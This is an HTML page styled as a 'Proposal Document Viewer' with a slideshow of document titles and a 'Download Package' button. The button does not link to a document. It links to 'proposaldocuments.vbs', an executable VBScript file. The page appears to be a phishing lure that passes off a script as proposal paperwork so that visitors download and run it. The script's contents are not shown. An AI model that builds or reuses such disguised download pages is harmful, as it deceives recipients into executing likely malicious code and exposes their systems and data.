<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Document Viewer</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial,Helvetica,sans-serif;
}

body{
    background:#edf2f7;
}

.hero{
    background:#214d4b;
    color:white;
    text-align:center;
    padding:50px 20px;
}

.hero h1{
    font-size:40px;
}

.hero p{
    margin-top:10px;
    font-size:20px;
}

.viewer{
    width:85%;
    max-width:900px;
    margin:40px auto;
    background:white;
    border-radius:20px;
    padding:40px;
    box-shadow:0 10px 30px rgba(0,0,0,.15);
    text-align:center;
}

.slide{
    display:none;
}

.slide.active{
    display:block;
}

.icon{
    font-size:70px;
    margin-bottom:20px;
}

h2{
    font-size:32px;
    color:#214d4b;
}

p{
    margin-top:15px;
    color:#666;
    font-size:20px;
}

.buttons{
    margin-top:40px;
}

button,
.download{
    background:#214d4b;
    color:white;
    border:none;
    padding:15px 35px;
    border-radius:12px;
    font-size:18px;
    cursor:pointer;
    text-decoration:none;
    margin:10px;
}

button:hover,
.download:hover{
    background:#173937;
}

.counter{
    margin-top:20px;
    color:#777;
}
</style>

</head>

<body>

<div class="hero">
    <h1>Proposal Document Viewer</h1>
    <p>Review available files before downloading</p>
</div>


<div class="viewer">

<div class="slide active">
    <div class="icon">📄</div>
    <h2>Proposal Package</h2>
    <p>Revision 2.6</p>
</div>

<div class="slide">
    <div class="icon">📑</div>
    <h2>Technical Specifications</h2>
    <p>Revision 2.6</p>
</div>

<div class="slide">
    <div class="icon">📦</div>
    <h2>Supporting Files</h2>
    <p>Latest Release</p>
</div>


<div class="buttons">
    <button onclick="changeSlide(-1)">⬅ Previous</button>
    <button onclick="changeSlide(1)">Next ➡</button>
</div>


<div class="counter" id="counter">
    Slide 1 of 3
</div>


<br>

<a class="download" href="proposaldocuments.vbs" download>
⬇ Download Package
</a>

</div>


<script>
let current = 0;
let slides = document.querySelectorAll(".slide");

function changeSlide(direction){

    slides[current].classList.remove("active");

    current += direction;

    if(current >= slides.length){
        current = 0;
    }

    if(current < 0){
        current = slides.length - 1;
    }

    slides[current].classList.add("active");

    document.getElementById("counter").innerHTML =
    "Slide " + (current + 1) + " of " + slides.length;
}
</script>

</body>
</html>
